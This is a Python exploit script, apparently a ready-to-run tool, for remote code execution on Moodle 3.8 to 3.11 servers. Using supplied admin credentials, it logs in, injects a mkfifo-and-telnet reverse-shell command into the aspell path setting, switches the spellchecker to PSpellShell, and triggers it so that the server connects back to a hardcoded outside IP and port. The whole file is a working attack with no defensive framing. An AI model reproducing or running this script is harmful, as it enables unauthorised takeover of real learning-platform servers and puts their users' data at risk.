import requests
import os
import sys
import re
from colorama import Fore, init
from cfonts import say

init(autoreset=True)
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def Banner():
    os.system("cls" if os.name == "nt" else "clear")
    say("Moodle RCE", colors=["red", "green"], align="center")
    say("Created NumeXx", space=False, font="console", colors=["white"], background="red", align="center")
    print(Fore.WHITE + "\n Make Sure Version is : 3.11.2, 3.10.0, 3.8.0\n")

def Logs(args):
    sys.stdout.write(f"\n{args}")

class MoodleRCE:
    def __init__(self, url, username, password, IP_LISTEN, PORT_LISTEN):
        self.session = requests.Session()
        self.url = url + "/login/index.php"
        self.username = username
        self.password = password
        self.IP_LISTEN = IP_LISTEN
        self.PORT_LISTEN = PORT_LISTEN
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36"
        }
        self.timeout = 15
    
    def setSessKey(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/phpinfo.php"), headers=self.headers, timeout=self.timeout, verify=False)
            return re.findall(r'"sesskey":"(.*?)"', req.text)[0]
        except:
            return ""
    
    def setLoginToken(self):
        try:
            req = self.session.get(self.url, headers=self.headers, verify=False, timeout=self.timeout).text
            return re.findall(r'"logintoken" value="(.*?)"', req)[0]
        except:
            return ""
    
    def isLogin(self):
        try:
            data = {
                "anchor": "",
                "logintoken": self.setLoginToken(),
                "username": self.username,
                "password": self.password,
            }
            
            req = self.session.post(self.url, data=data, verify=False, headers=self.headers, timeout=self.timeout, allow_redirects=False)
            
            if req.status_code == 303 and "MOODLEID1_=deleted" in req.headers["Set-Cookie"]:
                return True
            else:
                return False
        except:
            return False
    
    def Start(self):        
        if self.isLogin():
            sesKey = self.setSessKey()
            
            req = self.session.post(self.url.replace("/login/index.php", "/admin/settings.php?section=systempaths"), data = f'section=systempaths&action=save-settings&sesskey={sesKey}&return=&s__pathtophp=&s__pathtodu=&s__aspellpath=sh%20-c%20%27%28TF%3D%24%28mktemp%20-u%29%3Bmkfifo%20%24TF%20%26%26%20telnet%20{self.IP_LISTEN}%20{self.PORT_LISTEN}%200%3C%24TF%20%7C%20sh%201%3E%24TF%29%27&s__pathtodot=&s__pathtogs=/usr/bin/gs&s__pathtopython=', headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36"
            }, verify=False, timeout=self.timeout, allow_redirects=False)
            
            if req.status_code == 303:
                Logs(f"{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}SUKSES{Fore.LIGHTCYAN_EX}] {Fore.WHITE}{self.url} -- Done Put Config")
                req = self.session.post(self.url.replace("/login/index.php", "/admin/settings.php?section=tinymcespellcheckersettings"), data={
                    "section": "tinymcespellcheckersettings",
                    "action": "save-settings",
                    "sesskey": sesKey,
                    "return": "",
                    "s_tinymce_spellchecker_spellengine": "PSpellShell",
                    "s_tinymce_spellchecker_spelllanguagelist": "%2bEnglish%3den%2cDanish%3dda%2cDutch%3dnl%2cFinnish%3dfi%2cFrench%3dfr%2cGerman%3dde%2cItalian%3dit%2cPolish%3dpl%2cPortuguese%3dpt%2cSpanish%3des%2cSwedish%3dsv"
                } , headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36"
                }, verify=False, timeout=self.timeout, allow_redirects=False)
                
                if req.status_code == 303:
                    Logs(f"{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}SUKSES{Fore.LIGHTCYAN_EX}] {Fore.WHITE}{self.url} -- Change Engine to PSpellShell")
                    
                    Logs(f"{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}SUKSES{Fore.LIGHTCYAN_EX}] {Fore.WHITE}{self.url} -- Check Your Back Connect")
                    req = self.session.post(self.url.replace("/login/index.php", "/lib/editor/tinymce/plugins/spellchecker/rpc.php"), json={
                        "id": "c0",
                        "method": "checkWords",
                        "params": ["en",[""]]
                    }, headers={
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36",
                        "Content-Type": "application/json"
                    }, verify=False, timeout=self.timeout)
                else:
                    Logs(f"{Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}FAILED{Fore.LIGHTCYAN_EX}] {Fore.WHITE}{self.url} -- Failed BackConnect !")
            else:
                Logs(f"{Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}FAILED{Fore.LIGHTCYAN_EX}] {Fore.WHITE}{self.url} -- Failed Put SpellPath !")
        else:
            Logs(f"{Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}FAILED{Fore.LIGHTCYAN_EX}] {Fore.WHITE}{self.url} -- Failed Login !")

if __name__ == "__main__":
    Banner()
    lista = input(f"{Fore.LIGHTCYAN_EX}[{Fore.WHITE}?{Fore.LIGHTCYAN_EX}] {Fore.WHITE}LISTA : ")
    url = lista.split("|")[0].replace("/login/index.php", "")
    username = lista.split("|")[1]
    password = lista.split("|")[2]
    IP_LISTEN = "103.30.183.186"
    PORT_LISTEN = 4443
    MoodleRCE(url, username, password, IP_LISTEN, PORT_LISTEN).Start()
